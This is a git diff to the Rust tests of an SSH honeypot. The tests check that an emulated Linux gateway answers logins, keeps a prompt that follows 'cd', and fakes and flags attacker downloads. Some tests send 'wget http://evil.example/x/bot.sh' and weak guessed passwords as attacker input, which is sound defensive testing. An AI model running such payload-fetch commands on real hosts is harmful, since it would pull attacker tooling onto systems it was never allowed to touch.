@@ -105,6 +105,7 @@ mod tests {
     use crate::behavior::TrackFactory;
     use async_trait::async_trait;
     use hp_core::Passive;
+    use hp_world::World;
     use serde_json::Value;
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
     use tokio::net::TcpStream;
@@ -288,7 +289,10 @@ states:
         };
         let (addr, mut rx) = serve(
             Arc::new(hp_proto_banner::Banner),
-            Arc::new(TrackFactory::new(track)),
+            Arc::new(TrackFactory::new(
+                track,
+                Some(Arc::new(World::default_host())),
+            )),
             persona,
             4,
             LONG,
@@ -329,29 +333,22 @@ states:
         }
     }
 
-    /// The shipped example track, through the real SSH plugin, over a socket,
-    /// with a real SSH client: three failed logins, then in; a payload fetch
-    /// is faked and flagged. (Delays are shortened to keep the test fast.)
-    #[tokio::test]
-    async fn example_ssh_track_end_to_end() {
+    /// Start the real SSH plugin with the shipped example track and the
+    /// built-in emulated host, connect a real SSH client, and get through the
+    /// track's three failed logins. (Delays are shortened to keep tests fast.)
+    async fn example_ssh() -> (russh::client::Handle<SshClient>, Receiver<String>) {
         let yaml = include_str!("../../../tracks/ssh-linux-gateway.yaml")
             .replace("800ms..1500ms", "1ms")
             .replace("delay: 400ms", "delay: 1ms")
-            .replace("2s..4s", "1ms");
+            .replace("1s..3s", "1ms");
         let track = hp_track::Track::from_yaml(&yaml).unwrap();
         let persona = Persona {
             hostname: Some("plc-gw-03".into()),
             banner: None,
         };
         let ssh = hp_proto_ssh::Ssh::new(None).unwrap();
-        let (addr, mut rx) = serve(
-            Arc::new(ssh),
-            Arc::new(TrackFactory::new(track)),
-            persona,
-            4,
-            LONG,
-        )
-        .await;
+        let behavior = TrackFactory::new(track, Some(Arc::new(World::default_host())));
+        let (addr, rx) = serve(Arc::new(ssh), Arc::new(behavior), persona, 4, LONG).await;
 
         let tcp = TcpStream::connect(addr).await.unwrap();
         let mut c = russh::client::connect_stream(
@@ -362,20 +359,42 @@ states:
         .await
         .unwrap();
         for pw in ["123456", "admin", "password"] {
-            assert!(
-                !c.authenticate_password("admin", pw)
-                    .await
-                    .unwrap()
-                    .success(),
-                "{pw}"
-            );
+            let ok = c
+                .authenticate_password("admin", pw)
+                .await
+                .unwrap()
+                .success();
+            assert!(!ok, "{pw}");
         }
         assert!(c
             .authenticate_password("admin", "hunter2")
             .await
             .unwrap()
             .success());
+        (c, rx)
+    }
 
+    /// Read channel data until `needle` appears.
+    async fn read_until(ch: &mut russh::Channel<russh::client::Msg>, needle: &str) -> String {
+        let mut got = Vec::new();
+        tokio::time::timeout(Duration::from_secs(10), async {
+            while !String::from_utf8_lossy(&got).contains(needle) {
+                match ch.wait().await {
+                    Some(russh::ChannelMsg::Data { data }) => got.extend_from_slice(&data),
+                    Some(_) => {}
+                    None => break,
+                }
+            }
+        })
+        .await
+        .unwrap_or_else(|_| panic!("timed out waiting for {needle:?}"));
+        String::from_utf8_lossy(&got).into_owned()
+    }
+
+    /// One-shot commands (`ssh host cmd`) through the whole stack.
+    #[tokio::test]
+    async fn example_ssh_track_runs_exec_commands_on_the_emulated_host() {
+        let (c, mut rx) = example_ssh().await;
         let run = async |command: &str| {
             let mut ch = c.channel_open_session().await.unwrap();
             ch.exec(true, command).await.unwrap();
@@ -391,7 +410,7 @@ states:
         assert!(run("uname -a").await.starts_with("Linux plc-gw-03 5.15.0"));
         assert!(run("wget http://evil.example/x/bot.sh")
             .await
-            .contains("Saving to: 'bot.sh'"));
+            .contains("Saving to: ‘bot.sh’"));
         assert_eq!(
             run("frobnicate").await,
             "-bash: frobnicate: command not found\n"
@@ -404,6 +423,58 @@ states:
         assert_eq!(count("command"), 4);
         assert_eq!(count("tag"), 2, "auth_success and payload_fetch: {kinds:?}");
         assert_eq!(count("transition"), 1);
+        assert_eq!(count("behavior_error") + count("error"), 0, "{kinds:?}");
+    }
+
+    /// An interactive session: login banner, a prompt that follows `cd`, a
+    /// download that lands in the filesystem, and `exit` closing the session.
+    #[tokio::test]
+    async fn example_ssh_track_gives_an_interactive_shell_with_a_live_prompt() {
+        let (c, mut rx) = example_ssh().await;
+        let mut ch = c.channel_open_session().await.unwrap();
+        ch.request_pty(true, "xterm", 80, 24, 0, 0, &[])
+            .await
+            .unwrap();
+        ch.request_shell(true).await.unwrap();
+
+        let first = read_until(&mut ch, "$ ").await;
+        assert!(
+            first.starts_with(
+                "Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)\r\n"
+            ),
+            "{first:?}"
+        );
+        assert!(
+            first.contains("Last login: ") && first.contains(" from 10.20.0.14\r\n"),
+            "{first:?}"
+        );
+        assert!(first.ends_with("admin@plc-gw-03:~$ "), "{first:?}");
+
+        ch.data(&b"cd /tmp\r"[..]).await.unwrap();
+        let o = read_until(&mut ch, "$ ").await;
+        assert!(
+            o.ends_with("admin@plc-gw-03:/tmp$ "),
+            "the prompt follows cd: {o:?}"
+        );
+
+        ch.data(&b"wget -q http://evil.example/x/bot.sh\r"[..])
+            .await
+            .unwrap();
+        read_until(&mut ch, "/tmp$ ").await;
+        ch.data(&b"ls -l\r"[..]).await.unwrap();
+        let o = read_until(&mut ch, "/tmp$ ").await;
+        assert!(
+            o.contains("bot.sh") && o.contains(" admin admin "),
+            "the download landed: {o:?}"
+        );
+
+        ch.data(&b"exit\r"[..]).await.unwrap();
+        assert!(read_until(&mut ch, "logout").await.contains("logout\r\n"));
+
+        let kinds = kinds_until(&mut rx, "disconnect").await;
+        let count = |k: &str| kinds.iter().filter(|x| *x == k).count();
+        assert_eq!(count("command"), 4, "cd, wget, ls, exit: {kinds:?}");
+        assert_eq!(count("tag"), 2, "auth_success and payload_fetch: {kinds:?}");
         assert_eq!(count("behavior_error") + count("error"), 0, "{kinds:?}");
     }
 
